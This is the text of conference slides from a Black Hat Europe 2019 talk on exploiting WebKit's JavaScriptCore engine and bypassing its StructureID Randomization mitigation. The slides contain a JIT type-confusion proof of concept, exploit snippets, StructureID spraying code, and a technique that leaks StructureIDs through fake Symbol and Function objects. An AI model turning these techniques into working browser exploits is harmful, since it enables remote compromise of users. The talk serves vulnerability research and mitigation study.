Thinking outside the JIT Compiler: Understanding and bypassing StructureID Randomization with generic and old-school methods
WANG, YONG (@ThomasKing2014) Alibaba Security

Whoami
· WANG, YONG a.k.a. ThomasKing(@ThomasKing2014) · Security Engineer of Alibaba Security · Focus on Android/Browser vulnerability · Speaker at BlackHatAsia/HackInTheBox/Zer0Con ... · Nominated at Pwnie Award 2019(Best Privilege Escalation)
BHEU2019

Alibaba Security

Agenda
· JavaScriptCore Exploitation Basics · StructureID Randomization · New generic bypass · Conclusion
BHEU2019

Alibaba Security

Agenda
· JavaScriptCore Exploitation Basics · StructureID Randomization · New generic bypass · Conclusion
BHEU2019

Alibaba Security

What is JavaScriptCore
· JavaScript Engine of WebKit
· Apple's open-source web browser(Safari on OSX/iOS)
· Support almost all features of ECMAScript 6
· Complexity
· Interpreter and JIT compilers

BHEU2019

http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compiler-slides.pdf
Alibaba Security

What is JavaScriptCore
· JavaScript Engine of WebKit
· Apple's open-source web browser(Safari on OSX/iOS)
· Support almost all features of ECMAScript 6
· Complexity
· Interpreter and JIT compilers · Lots of exploitable bugs

BHEU2019

http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compiler-slides.pdf
Alibaba Security

A typical JIT Bug
· http://rce.party/wtf.js (Luca Todesco @qwertyoruiop)

BHEU2019

Alibaba Security

A typical JIT Bug
Minimized PoC:
let s = new Date(); s[1] = 1; Date.prototype.__proto__ = new Proxy(Date.prototype.__proto__, {
has: function() { /* Side Effect */ } }); let r = 5 in s;

· "IN" operation
· Check a property

BHEU2019

Alibaba Security

A typical JIT Bug
Minimized PoC:
let s = new Date(); s[1] = 1; Date.prototype.__proto__ = new Proxy(Date.prototype.__proto__, {
has: function() { /* Side Effect */ } }); let r = 5 in s;

· "IN" operation
· Check a property
· HasIndexedProperty
· Forget to mark as Prototype · Incorrect side-effect model

BHEU2019

Alibaba Security

A typical JIT Bug
Minimized PoC:
let s = new Date(); s[1] = 1; Date.prototype.__proto__ = new Proxy(Date.prototype.__proto__, {
has: function() { /* Side Effect */ } }); let r = 5 in s;
BHEU2019

· "IN" operation
· Check a property
· HasIndexedProperty
· Forget to mark as Prototype · Incorrect side-effect model
· Type confusion
· Element transition
Alibaba Security

A typical JIT Bug

Exploit snippet:
function do_hack(oj, f64, u32, doubleArray) { doubleArray[0]; let r = 7 in oj; f64[0] = f64[1] = doubleArray[1]; u32[2] += 0x10; doubleArray[1] = f64[1]; return r;
} for(let i = 0; i < 10000; i++) {
do_hack(d, hack_f64, hack_u32, evl_array); }
BHEU2019

· "IN" operation
· Check a property
· HasIndexedProperty
· Forget to mark as Prototype · Incorrect side-effect model
· Type confusion
· Element transition · Leak the address · Fake JSObjects

Alibaba Security

Exploitation Basics w/o StructureID Randomization
· Exploit steps:
· 0. Create many differently-shaped JSObjects · 1. Prepare the crafted container · 2. Trigger the bug and gain one crafted fake JSObject · 3. Build the ADDROF and FAKEOBJ primitives · 4. Build the AARW primitives and tackle the GC issue · 5. ....

BHEU2019

Alibaba Security

Exploitation Basics w/o StructureID Randomization
· Exploit steps:
· 0. Create many differently-shaped JSObjects · 1. Prepare the crafted container · 2. Trigger the bug and gain one crafted fake JSObject · 3. Build the ADDROF and FAKEOBJ primitives · 4. Build the AARW primitives and tackle the GC issue · 5. ....

· Prepare the "shape" for the fake JSOBJECT
BHEU2019

Alibaba Security

Agenda
· JavaScriptCore Exploitation Basics · StructureID Randomization · New generic bypass · Conclusion
BHEU2019

Alibaba Security

Review JSObject Basics

· let o = {a: 0x41, b: 0x42};

+ 0x00 + 0x08 + 0x10 + 0x18

JSCell Bufferfly Pointer Inline Property: `a' Inline Property: `b'

StructureID IndexingType
JSType InlineTypeFlags
CellState

BHEU2019

Alibaba Security

Review JSObject Basics

· let o = {a: 0x41, b: 0x42};

+ 0x00 + 0x08 + 0x10 + 0x18

JSCell Bufferfly Pointer Inline Property: `a' Inline Property: `b'

StructureID IndexingType
JSType InlineTypeFlags
CellState

BHEU2019

Alibaba Security

Review JSObject Basics

· let o = {a: 0x41, b: 0x42};

+ 0x00 + 0x08 + 0x10 + 0x18

JSCell Bufferfly Pointer Inline Property: `a' Inline Property: `b'

StructureID IndexingType
JSType InlineTypeFlags
CellState

S1 Pointer ...
Sm Pointer ...
Sn Pointer

BHEU2019

Alibaba Security

Review JSObject Basics

· let o = {a: 0x41, b: 0x42};

+ 0x00 + 0x08 + 0x10 + 0x18

JSCell Bufferfly Pointer Inline Property: `a' Inline Property: `b'

StructureID IndexingType
JSType InlineTypeFlags
CellState

BHEU2019

S1 Pointer ...
Sm Pointer ...
Sn Pointer
a: 0 b: 1
Alibaba Security

Guess/Predict StructureID

· Samuel Groß(@5aelo)'s phrack article introduces the StructureID spraying

· StructureIDs are allocated sequentially on the fresh state

· Just create many differently-shaped JSObjects
for (var i = 0; i < 0x1000; ++i) { var arr = [7.7, 7.7]; arr['prop' + i] = 0x10; structures.push(arr);
}

BHEU2019

Alibaba Security

StructureID Randomization
· 7 entropy bits
· 2^7 < 1%

BHEU2019

Alibaba Security

StructureID Randomization
· 7 entropy bits
· 2^7 < 1%
· Encode the real structure pointer
· Wrong guess equals invalid "shape"

BHEU2019

Alibaba Security

StructureID Randomization
· 7 entropy bits
· 2^7 < 1%
· Encode the real structure pointer
· Wrong guess equals invalid "shape"
· Invalid shape
· Accessing properties leads to crash

BHEU2019

Alibaba Security

Bug-specific Way
· Luca Todesco(@qwertyoruiop) presents it at MOSEC2019
· The bug derives from register allocator
· Conditional branch can skip the spill · Some stack data remain uninitialized
· Type confusion
· Build a OOB read primitive to leak the valid structureID

BHEU2019

Alibaba Security

JIT Compiler Related Way
· Luca Todesco(@qwertyoruiop) presents it at MOSEC2019

BHEU2019

Alibaba Security

JIT Compiler Related Way
· Luca Todesco(@qwertyoruiop) presents it at MOSEC2019

BHEU2019

https://trac.webkit.org/changeset/240023/webkit

Alibaba Security

Agenda
· JavaScriptCore Exploitation Basics · StructureID Randomization · New generic bypass · Conclusion
BHEU2019

Alibaba Security

Think outside the JIT Compiler
· Abusing the other feature of JIT optimization might bypass it

BHEU2019

Alibaba Security

Think outside the JIT Compiler
· Abusing the other feature of JIT optimization might bypass it
· ASLR(Address Space Layout Randomization)
· Weakness · Leak some data to calculate the slide

BHEU2019

Alibaba Security

Think outside the JIT Compiler
· Abusing the other feature of JIT optimization might bypass it
· ASLR(Address Space Layout Randomization)
· Weakness · Leak some data to calculate the slide
· StructureID Randomization
· Weakness(1/128) · Leak the valid StructureID of one known shape JSObject

BHEU2019

Alibaba Security

Brute force
inline bool StructureIDTable::isValid(StructureID structureID) {
if (!structureID) return false;
uint32_t structureIndex = structureID >> s_numberOfEntropyBits; if (structureIndex >= m_capacity)
return false; #if CPU(ADDRESS64)
Structure* structure = decode(table()[structureIndex].encodedStructureBits, structureID); if (reinterpret_cast<uintptr_t>(structure) >> s_entropyBitsShiftForStructurePointer)
return false; #endif
return true; }
BHEU2019

Alibaba Security

Brute force

inline bool StructureIDTable::isValid(StructureID structureID)

{

if (!structureID)

return false;

uint32_t structureIndex = structureID >> s_numberOfEntropyBits; if (structureIndex >= m_capacity)
return false;

NO REF !

#if CPU(ADDRESS64)

Structure* structure = decode(table()[structureIndex].encodedStructureBits, structureID);

if (reinterpret_cast<uintptr_t>(structure) >> s_entropyBitsShiftForStructurePointer)

return false;

#endif

return true;

}

BHEU2019

Alibaba Security

Think outside the JIT Compiler
· Invalid shape != crash
· A fake JSObject w/o valid StructureID can still alive until GC works

BHEU2019

Alibaba Security

Think outside the JIT Compiler
· Invalid shape != crash
· A fake JSObject w/o valid StructureID can still alive until GC works
· How to hack with the semi-faked JSObject?

BHEU2019

Alibaba Security

Think outside the JIT Compiler
· Invalid shape != crash
· A fake JSObject w/o valid StructureID can still alive until GC works
· How to hack with the semi-faked JSObject?
· Do all the internal builtin functions rely on the valid StructureID?

BHEU2019

Alibaba Security

Think outside the JIT Compiler
· Invalid shape != crash
· A fake JSObject w/o valid StructureID can still alive until GC works
· How to hack with the semi-faked JSObject? · Do all the internal builtin functions rely on the valid StructureID? · If there is one function not required StructureID, how to find it?

BHEU2019

Alibaba Security

Prototype
let o = {a:1, b:2, c:3}; o[0] = 1; o[1] = 2;
o.slice(); // Exception: TypeError: o.slice is not a function Array.prototype.slice.call(o);

ArrayPrototype.cpp: EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(JSGlobalObject* globalObject, CallFrame* callFrame) {
// https://tc39.github.io/ecma262/#sec-array.prototype.slice VM& vm = globalObject->vm(); auto scope = DECLARE_THROW_SCOPE(vm); JSObject* thisObj = callFrame->thisValue().toThis(globalObject, StrictMode).toObject(globalObject); EXCEPTION_ASSERT(!!scope.exception() == !thisObj); if (UNLIKELY(!thisObj)) ...

BHEU2019

Alibaba Security

Think
function f() { return "hello world";
} print(Function.prototype.toString.call(f));
// Output the source code function f() {
return "hello world"; }

JSCell ...
String Pointer ...
Semi-faked object

BHEU2019

JSCell ...
String ...
String object
Alibaba Security

Symbol Prototype toString()
SymbolPrototype.cpp:
EncodedJSValue JSC_HOST_CALL symbolProtoFuncToString(JSGlobalObject* globalObject, CallFrame* callFrame) {
VM& vm = globalObject->vm(); auto scope = DECLARE_THROW_SCOPE(vm);
Symbol* symbol = tryExtractSymbol(vm, callFrame->thisValue()); // [1] if (!symbol)
return throwVMTypeError(globalObject, scope, SymbolToStringTypeError); RELEASE_AND_RETURN(scope, JSValue::encode(jsNontrivialString(vm, symbol->descriptiveString()))); // [2] }

BHEU2019

Alibaba Security

Symbol Prototype toString()

inline Symbol* asSymbol(JSValue value) {
ASSERT(value.asCell()->isSymbol()); return jsCast<Symbol*>(value.asCell()); }

template<typename To, typename From> inline To jsCast(From* from) {
return static_cast<To>(from); }

inline Symbol* tryExtractSymbol(VM& vm, JSValue thisValue) {
if (thisValue.isSymbol()) return asSymbol(thisValue);
...

String Symbol::descriptiveString() const
{ return makeString("Symbol(", String(m_privateName.uid()), ')');
}

BHEU2019

Alibaba Security

Symbol Prototype toString()

· let o = Symbol("hello world");

JSCell PrivateName Pointer
Symbol object

Length

Flag

Pointer

String object

hello world Content

BHEU2019

Alibaba Security

Leak valid structureID

· let o = Symbol("hello world");

JSCell PrivateName Pointer
Symbol object

Length

Flag

Pointer

String object

JSCell PrivateName Pointer
Semi-faked object

Length

Flag

Pointer

Semi-faked object

BHEU2019

hello world
Content
JSCell Bufferfly Pointer
... Known shape object
Alibaba Security

Leak valid structureID

+ 0x00 + 0x08 + 0x10 + 0x18 + 0x20 + 0x28

JSCell

Bufferfly Pointer

Semi-fake Symbol JSCell

String Pointer

Length

Flag

Known shape object pointer

BHEU2019

Container

var container = { jscell: symb_cell, m_uid: null, str_len: len_flag, str_ptr: double_arr
}

Alibaba Security

Leak valid structureID

+ 0x00 + 0x08 + 0x10 + 0x18 + 0x20 + 0x28

JSCell

Bufferfly Pointer

Semi-fake Symbol JSCell

String Pointer

Length

Flag

Known shape object pointer

BHEU2019

Container

var container = { jscell: symb_cell, m_uid: null, str_len: len_flag, str_ptr: double_arr
} do_hack(); ... container.m_uid = fake_str; let leak_id = Symbol.prototype.toString.call(fake_symb); for (var i = 0; i < 2; i++) {
// skip "Symbol(" print((leak_id.charCodeAt(7+i)).toString(16)); };
Alibaba Security

Think and Repeat
· PRO
· Leak the valid StructureID of one known shape JSObject · Just abuse the feature of Runtime (Not related to JIT compiler)

BHEU2019

Alibaba Security

Think and Repeat
· PRO
· Leak the valid StructureID of one known shape JSObject · Just abuse the feature of Runtime (Not related to JIT compiler)
· CON
· Require two semi-faked objects (Not the real problem)
· How about just one semi-faked object? !

BHEU2019

Alibaba Security

Function Prototype toString()

FunctionPrototype.cpp:

EncodedJSValue JSC_HOST_CALL functionProtoFuncToString(JSGlobalObject* globalObject, CallFrame* callFrame) {
VM& vm = globalObject->vm(); auto scope = DECLARE_THROW_SCOPE(vm);

JSValue thisValue = callFrame->thisValue(); if (thisValue.inherits<JSFunction>(vm)) {
JSFunction* function = jsCast<JSFunction*>(thisValue); if (function->isHostOrBuiltinFunction())
RELEASE_AND_RETURN(scope, JSValue::encode(jsMakeNontrivialString(globalObject, "function ", function->name(vm), "() {\n [native code]\n}")));

FunctionExecutable* executable = function->jsExecutable(); if (executable->isClass())
return JSValue::encode(jsString(vm, executable->classSource().view().toString())); ...

BHEU2019

Alibaba Security

Function Prototype toString()
String JSFunction::name(VM& vm) {
... const Identifier identifier = jsExecutable()->name(); if (identifier == vm.propertyNames->builtinNames().starDefaultPrivateName())
return emptyString(); return identifier.string(); }
inline FunctionExecutable* JSFunction::jsExecutable() const {
ASSERT(!isHostFunctionNonInline()); return static_cast<FunctionExecutable*>(m_executable.get()); }
BHEU2019

Alibaba Security

Function Prototype toString()

JSCallee ExecutableBase FunctionRareData JSGlobalObject JSFunction object

ExecutableBase
...
UnlinkedFunctionExecutable
...
FunctionExecutable

JSCell
...
Identifier
...
UnlinkedFunctionExecutable

BHEU2019

function f() { return "hello world";
}
Source code

Length

Flag

Pointer Identifier String

Alibaba Security

Leak valid structureID

Length Flag

Faked JSCell Known Shape JSObject
Pointer ExecutableBase
null Semi-faked object

BHEU2019

ExecutableBase
...
UnlinkedFunctionExecutable
...
FunctionExecutable JSObject

null
...
Identifier
...
UnlinkedFunctionExecutable JSObject

JSCell Butterfly Pointer Known Shape JSObject

Alibaba Security

Leak valid structureID

Length Flag

Faked JSCell Known Shape JSObject
Pointer ExecutableBase
null Semi-faked object

ExecutableBase
...
UnlinkedFunctionExecutable
...
FunctionExecutable JSObject

null
...
Identifier
...
UnlinkedFunctionExecutable JSObject

Not all the bits of length are controllable! But it will not cause crash because of NO OOB READ!
for (var i = 0; i < 2; i++) { print((leak_id.charCodeAt(9 + i)).toString(16));
};

JSCell Butterfly Pointer Known Shape JSObject

BHEU2019

Alibaba Security

Leak valid structureID

Length Flag

Faked JSCell Known Shape JSObject
Pointer ExecutableBase
null Semi-faked object !

ExecutableBase
...
UnlinkedFunctionExecutable
...
FunctionExecutable JSObject

null
...
Identifier
...
UnlinkedFunctionExecutable JSObject

Not all the bits of length are controllable! But it will not cause crash because of NO OOB READ!
for (var i = 0; i < 2; i++) { print((leak_id.charCodeAt(9 + i)).toString(16));
};

JSCell Butterfly Pointer Known Shape JSObject

BHEU2019

Alibaba Security

Exploitation with/without StructureID Randomization
· Exploit steps:
· 0. Prepare the crafted container and the helper JSObjects · 1. Trigger the bug and gain one Semi-fake JSObject · 2. Call Function.prototype.toString and leak the valid StructureID · 3. Fix the Semi-fake JSObject with the valid StructureID · 4. Build the ADDROF and FAKEOBJ primitives · 5. Build the AARW primitives and tackle the GC issue · 6. ....

BHEU2019

Alibaba Security

Agenda
· JavaScriptCore Exploitation Basics · StructureID Randomization · New generic bypass · Conclusion
BHEU2019

Alibaba Security

Takeaways
· 1. The core steps of JavaScriptCore engine exploitation have been discussed.
· 2. StructureID Randomization mitigation has been fully discussed.
· 3. The idea "Think outside the JIT compiler" and the new and generic methods to bypass the StructureID Randomization mitigation have been detailed.

BHEU2019

Alibaba Security

References
· http://www.filpizlo.com/slides/pizlo-splash2018-jsc-compilerslides.pdf
· https://saelo.github.io/presentations/blackhat_us_18_attacking_clie nt_side_jit_compilers.pdf
· http://www.phrack.org/papers/attacking_javascript_engines.html · https://github.com/WebKit/webkit/commit/f19aec9c6319a216f336a
acd1f5cc75abba49cdf · http://iokit.racing/jsctales.pdf

BHEU2019

Alibaba Security

Thank you!
WANG, YONG (@ThomasKing2014) Alibaba Security

